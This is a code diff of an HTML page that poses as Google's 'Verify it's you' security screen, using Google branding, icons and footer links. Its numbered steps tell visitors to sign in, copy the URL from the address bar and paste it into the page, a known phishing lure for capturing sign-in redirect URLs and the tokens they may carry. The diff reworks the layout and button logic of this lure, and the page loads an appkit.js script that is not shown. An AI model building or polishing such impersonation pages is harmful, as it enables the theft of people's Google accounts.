@@ -1,423 +1,345 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in with Google</title>
-  <!-- Font Awesome for icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', 'Noto Sans', sans-serif;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify it's you · Google</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', 'Noto Sans', sans-serif;
+        }
 
-    body {
-      background: #f5f7fa;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-      margin: 0;
-      transition: background 0.3s ease;
-    }
+        body {
+            background: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            margin: 0;
+        }
 
-    /* --- SIGN-IN BUTTON SCREEN (visible initially) --- */
-    #signin-screen {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 1.5rem;
-      transition: opacity 0.4s ease, transform 0.4s ease;
-    }
+        .card {
+            max-width: 600px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.06), 0 2px 10px rgba(0, 0, 0, 0.02);
+            padding: 2.5rem 2.8rem 2rem 2.8rem;
+            transition: 0.2s;
+        }
 
-    #signin-screen.hidden {
-      opacity: 0;
-      transform: scale(0.95);
-      pointer-events: none;
-      position: absolute;
-    }
+        /* ---- header: "Verify it's you" ---- */
+        .verify-header {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
 
-    .google-signin-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.75rem;
-      background: #ffffff;
-      border: 1px solid #dadce0;
-      border-radius: 40px;
-      padding: 0.9rem 2.4rem;
-      font-size: 1.1rem;
-      font-weight: 500;
-      color: #3c4043;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
-      min-width: 240px;
-      letter-spacing: 0.2px;
-    }
+        .verify-header i {
+            font-size: 1.8rem;
+            color: #1f2a3a;
+            background: #eef2f7;
+            padding: 0.3rem;
+            border-radius: 40px;
+            width: 2.2rem;
+            text-align: center;
+        }
 
-    .google-signin-btn i {
-      font-size: 1.6rem;
-      color: #4285f4;
-    }
+        .verify-header h1 {
+            font-size: 2rem;
+            font-weight: 550;
+            letter-spacing: -0.02em;
+            color: #1f2a3a;
+        }
 
-    .google-signin-btn:hover {
-      background: #f8f9fa;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-      border-color: #c5cbd5;
-    }
+        /* ---- sub text ---- */
+        .sub-text {
+            color: #3c4043;
+            font-size: 1rem;
+            line-height: 1.5;
+            margin: 0.6rem 0 1.6rem 0;
+            padding-right: 0.2rem;
+        }
 
-    .google-signin-btn:active {
-      transform: scale(0.97);
-      background: #f1f3f5;
-    }
+        .sub-text strong {
+            font-weight: 550;
+            color: #1f2a3a;
+        }
 
-    /* small hint under the button */
-    .hint-text {
-      color: #5f6b7a;
-      font-size: 0.85rem;
-      letter-spacing: 0.3px;
-    }
+        /* ---- ordered steps (clean, with numbers) ---- */
+        .step-list {
+            list-style: none;
+            counter-reset: step-counter;
+            padding-left: 0;
+            margin: 1.8rem 0 2.2rem 0;
+        }
 
-    /* --- VERIFICATION CARD (hidden initially) --- */
-    #verify-screen {
-      display: none;
-      opacity: 0;
-      transform: translateY(12px);
-      transition: opacity 0.4s ease, transform 0.4s ease;
-      width: 100%;
-      max-width: 600px;
-    }
+        .step-list li {
+            counter-increment: step-counter;
+            margin-bottom: 1.2rem;
+            padding-left: 2.8rem;
+            position: relative;
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #1f2a3a;
+        }
 
-    #verify-screen.visible {
-      display: block;
-      opacity: 1;
-      transform: translateY(0);
-    }
+        .step-list li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 0;
+            top: -0.1rem;
+            width: 2rem;
+            height: 2rem;
+            background: #eef1f6;
+            color: #1f2a3a;
+            font-weight: 550;
+            font-size: 0.95rem;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    .card {
-      width: 100%;
-      background: #ffffff;
-      border-radius: 32px;
-      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.06), 0 2px 10px rgba(0, 0, 0, 0.02);
-      padding: 2.5rem 2.8rem 2rem 2.8rem;
-      transition: 0.2s;
-    }
+        .step-list li .inline-code {
+            background: #eef1f6;
+            padding: 0.1rem 0.8rem;
+            border-radius: 30px;
+            font-weight: 500;
+            font-size: 0.95rem;
+            color: #1f2a3a;
+            white-space: nowrap;
+        }
 
-    .verify-header {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      margin-bottom: 0.5rem;
-    }
+        .step-list li .inline-code i {
+            margin-right: 4px;
+            font-size: 0.85rem;
+            color: #3c4043;
+        }
 
-    .verify-header i {
-      font-size: 1.8rem;
-      color: #1f2a3a;
-      background: #eef2f7;
-      padding: 0.3rem;
-      border-radius: 40px;
-      width: 2.2rem;
-      text-align: center;
-    }
+        /* ---- Google Login Button (appkit) ---- */
+        .googleLoginBtn {
+            margin: 0.5rem 0 1rem 0;
+            display: flex;
+            justify-content: flex-start;
+        }
 
-    .verify-header h1 {
-      font-size: 2rem;
-      font-weight: 550;
-      letter-spacing: -0.02em;
-      color: #1f2a3a;
-    }
+        .googleLoginBtn appkit-button {
+            min-width: 200px;
+        }
 
-    .sub-text {
-      color: #3c4043;
-      font-size: 1rem;
-      line-height: 1.5;
-      margin: 0.6rem 0 1.6rem 0;
-    }
+        /* ---- action row: Sign in with Google + Paste URL ---- */
+        .action-row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 1rem 1.2rem;
+            margin: 1.8rem 0 2.2rem 0;
+            border-top: 1px solid #e6eaef;
+            padding-top: 2rem;
+        }
 
-    .step-list {
-      list-style: none;
-      counter-reset: step-counter;
-      padding-left: 0;
-      margin: 1.8rem 0 2.2rem 0;
-    }
+        /* Заменяем "Sign In" на "Sign in with Google" */
+        .btn-signin-google {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            border-radius: 40px;
+            padding: 0.7rem 2rem;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #3c4043;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+            letter-spacing: 0.2px;
+        }
 
-    .step-list li {
-      counter-increment: step-counter;
-      margin-bottom: 1.2rem;
-      padding-left: 2.8rem;
-      position: relative;
-      font-size: 1rem;
-      line-height: 1.5;
-      color: #1f2a3a;
-    }
+        .btn-signin-google i {
+            font-size: 1.4rem;
+            color: #4285f4;
+        }
 
-    .step-list li::before {
-      content: counter(step-counter);
-      position: absolute;
-      left: 0;
-      top: -0.1rem;
-      width: 2rem;
-      height: 2rem;
-      background: #eef1f6;
-      color: #1f2a3a;
-      font-weight: 550;
-      font-size: 0.95rem;
-      border-radius: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+        .btn-signin-google:hover {
+            background: #f8f9fa;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            border-color: #c5cbd5;
+        }
 
-    .step-list li .inline-code {
-      background: #eef1f6;
-      padding: 0.1rem 0.8rem;
-      border-radius: 30px;
-      font-weight: 500;
-      font-size: 0.95rem;
-      color: #1f2a3a;
-      white-space: nowrap;
-    }
+        .btn-signin-google:active {
+            transform: scale(0.97);
+            background: #f1f3f5;
+        }
 
-    .step-list li .inline-code i {
-      margin-right: 4px;
-      font-size: 0.85rem;
-      color: #3c4043;
-    }
+        .btn-paste {
+            background: transparent;
+            border: 1px solid #dadce0;
+            border-radius: 40px;
+            padding: 0.7rem 2.4rem;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #1f2a3a;
+            cursor: default;
+            background: #fcfcfd;
+        }
 
-    /* Google Login Button (appkit) inside verify card */
-    .googleLoginBtn {
-      margin: 0.5rem 0 1rem 0;
-      display: flex;
-      justify-content: flex-start;
-    }
+        .btn-paste i {
+            margin-right: 0.5rem;
+            color: #3c4043;
+        }
 
-    .googleLoginBtn appkit-button {
-      min-width: 200px;
-    }
+        /* ---- bottom bar: English · Help · Privacy · Terms ---- */
+        .footer-bar {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            border-top: 1px solid #e6eaef;
+            padding-top: 1.4rem;
+            margin-top: 0.4rem;
+        }
 
-    .action-row {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: flex-start;
-      gap: 1rem 1.2rem;
-      margin: 1.8rem 0 2.2rem 0;
-      border-top: 1px solid #e6eaef;
-      padding-top: 2rem;
-    }
+        .lang-selector {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #1f2a3a;
+            font-size: 0.95rem;
+            font-weight: 450;
+        }
 
-    .btn-signin {
-      background: #1a6bb0;
-      color: white;
-      border: none;
-      border-radius: 40px;
-      padding: 0.7rem 2.4rem;
-      font-size: 1rem;
-      font-weight: 500;
-      cursor: default;
-      box-shadow: 0 2px 8px rgba(26, 107, 176, 0.15);
-      letter-spacing: 0.3px;
-    }
+        .lang-selector i {
+            color: #5f6b7a;
+            font-size: 0.9rem;
+        }
 
-    .btn-signin i {
-      margin-right: 0.4rem;
-    }
+        .footer-links {
+            display: flex;
+            gap: 1.6rem;
+            flex-wrap: wrap;
+        }
 
-    .btn-paste {
-      background: transparent;
-      border: 1px solid #dadce0;
-      border-radius: 40px;
-      padding: 0.7rem 2.4rem;
-      font-size: 1rem;
-      font-weight: 500;
-      color: #1f2a3a;
-      cursor: default;
-      background: #fcfcfd;
-    }
+        .footer-links a {
+            color: #1f2a3a;
+            text-decoration: none;
+            font-size: 0.95rem;
+            font-weight: 450;
+            transition: 0.1s;
+            border-bottom: 1px solid transparent;
+        }
 
-    .btn-paste i {
-      margin-right: 0.5rem;
-      color: #3c4043;
-    }
+        .footer-links a:hover {
+            border-bottom-color: #1f2a3a;
+        }
 
-    .footer-bar {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: space-between;
-      border-top: 1px solid #e6eaef;
-      padding-top: 1.4rem;
-      margin-top: 0.4rem;
-    }
-
-    .lang-selector {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: #1f2a3a;
-      font-size: 0.95rem;
-      font-weight: 450;
-    }
-
-    .lang-selector i {
-      color: #5f6b7a;
-      font-size: 0.9rem;
-    }
-
-    .footer-links {
-      display: flex;
-      gap: 1.6rem;
-      flex-wrap: wrap;
-    }
-
-    .footer-links a {
-      color: #1f2a3a;
-      text-decoration: none;
-      font-size: 0.95rem;
-      font-weight: 450;
-      transition: 0.1s;
-      border-bottom: 1px solid transparent;
-    }
-
-    .footer-links a:hover {
-      border-bottom-color: #1f2a3a;
-    }
-
-    @media (max-width: 480px) {
-      .card {
-        padding: 1.8rem 1.5rem;
-      }
-      .verify-header h1 {
-        font-size: 1.6rem;
-      }
-      .action-row {
-        flex-direction: column;
-        align-items: stretch;
-      }
-      .btn-signin,
-      .btn-paste {
-        text-align: center;
-        width: 100%;
-      }
-      .footer-bar {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 0.8rem;
-      }
-      .footer-links {
-        gap: 1rem;
-      }
-      .step-list li {
-        padding-left: 2.4rem;
-      }
-      .googleLoginBtn {
-        justify-content: center;
-      }
-      .google-signin-btn {
-        min-width: 200px;
-        padding: 0.8rem 1.8rem;
-        font-size: 1rem;
-      }
-    }
-  </style>
+        /* ---- responsive ---- */
+        @media (max-width: 480px) {
+            .card {
+                padding: 1.8rem 1.5rem;
+            }
+            .verify-header h1 {
+                font-size: 1.6rem;
+            }
+            .action-row {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .btn-signin-google,
+            .btn-paste {
+                text-align: center;
+                justify-content: center;
+                width: 100%;
+            }
+            .footer-bar {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.8rem;
+            }
+            .footer-links {
+                gap: 1rem;
+            }
+            .step-list li {
+                padding-left: 2.4rem;
+            }
+            .googleLoginBtn {
+                justify-content: center;
+            }
+        }
+    </style>
 </head>
 <body>
 
-  <!-- ===== SIGN-IN BUTTON SCREEN (visible initially) ===== -->
-  <div id="signin-screen">
-    <button class="google-signin-btn" id="googleSigninBtn">
-      <i class="fab fa-google"></i>
-      <span>Sign in with Google</span>
-    </button>
-    <div class="hint-text">Secure · One‑click access</div>
-  </div>
-
-  <!-- ===== VERIFICATION SCREEN (hidden initially) ===== -->
-  <div id="verify-screen">
     <div class="card">
-      <!-- header -->
-      <div class="verify-header">
-        <i class="fas fa-shield-alt"></i>
-        <h1>Verify it's you</h1>
-      </div>
-
-      <div class="sub-text">
-        To help keep your account secure, Google needs to verify it's you. Please follow the instructions.
-      </div>
-
-      <ol class="step-list">
-        <li><strong>Sign in</strong> to your Google Account.</li>
-        <li>Copy the URL from the address bar.</li>
-        <li>Click <span class="inline-code"><i class="fas fa-link"></i>Paste URL</span> and confirm paste.</li>
-      </ol>
-
-      <!-- Google Login Button (appkit) -->
-      <div class="googleLoginBtn"></div>
-
-      <!-- Sign In + Paste URL row -->
-      <div class="action-row">
-        <div class="btn-signin">
-          <i class="fas fa-sign-in-alt"></i> Sign In
+        <!-- header: Verify it's you -->
+        <div class="verify-header">
+            <i class="fas fa-shield-alt"></i>
+            <h1>Verify it's you</h1>
         </div>
-        <div class="btn-paste">
-          <i class="fas fa-paste"></i> Paste URL
-        </div>
-      </div>
 
-      <!-- bottom bar -->
-      <div class="footer-bar">
-        <div class="lang-selector">
-          <i class="fas fa-globe-americas"></i>
-          <span>English</span>
+        <!-- description -->
+        <div class="sub-text">
+            To help keep your account secure, Google needs to verify it's you.<br />
+            Please follow the instructions.
         </div>
-        <div class="footer-links">
-          <a href="#">Help</a>
-          <a href="#">Privacy</a>
-          <a href="#">Terms</a>
+
+        <!-- numbered steps -->
+        <ol class="step-list">
+            <li><strong>Sign in</strong> to your Google Account.</li>
+            <li>Copy the URL from the address bar.</li>
+            <li>Click <span class="inline-code"><i class="fas fa-link"></i>Paste URL</span> and confirm paste.</li>
+        </ol>
+
+        <!-- Google Login Button (appkit) -->
+        <div class="googleLoginBtn"></div>
+
+        <!-- action row: Sign in with Google + Paste URL -->
+        <div class="action-row">
+            <button class="btn-signin-google" id="googleSigninBtn">
+                <i class="fab fa-google"></i>
+                <span>Sign in with Google</span>
+            </button>
+            <div class="btn-paste">
+                <i class="fas fa-paste"></i> Paste URL
+            </div>
         </div>
-      </div>
+
+        <!-- bottom bar -->
+        <div class="footer-bar">
+            <div class="lang-selector">
+                <i class="fas fa-globe-americas"></i>
+                <span>English</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <!-- AppKit script -->
-  <script src="./appkit.js"></script>
+    <!-- AppKit script -->
+    <script src="./appkit.js"></script>
 
-  <script>
-    (function() {
-      // Elements
-      const signinScreen = document.getElementById('signin-screen');
-      const verifyScreen = document.getElementById('verify-screen');
-      const signinBtn = document.getElementById('googleSigninBtn');
+    <script>
+        // Обработчик для кнопки "Sign in with Google" (нижняя)
+        document.getElementById('googleSigninBtn')?.addEventListener('click', function() {
+            alert('Sign in with Google clicked!');
+            // Здесь можно добавить логику входа через Google
+        });
 
-      // Function to switch from button → verify card
-      function showVerifyScreen() {
-        // 1. hide sign-in button screen with fade
-        signinScreen.classList.add('hidden');
-
-        // 2. show verify screen after a tiny delay (for smooth transition)
-        setTimeout(() => {
-          verifyScreen.style.display = 'block';
-          // trigger opacity + transform via class
-          requestAnimationFrame(() => {
-            verifyScreen.classList.add('visible');
-          });
-        }, 150);
-      }
-
-      // Click handler on the "Sign in with Google" button
-      if (signinBtn) {
-        signinBtn.addEventListener('click', showVerifyScreen);
-      }
-
-      console.log('Ready: click "Sign in with Google" to show verification card.');
-    })();
-  </script>
+        console.log('Ready: "Sign in with Google" button is active.');
+    </script>
 
 </body>
 </html>
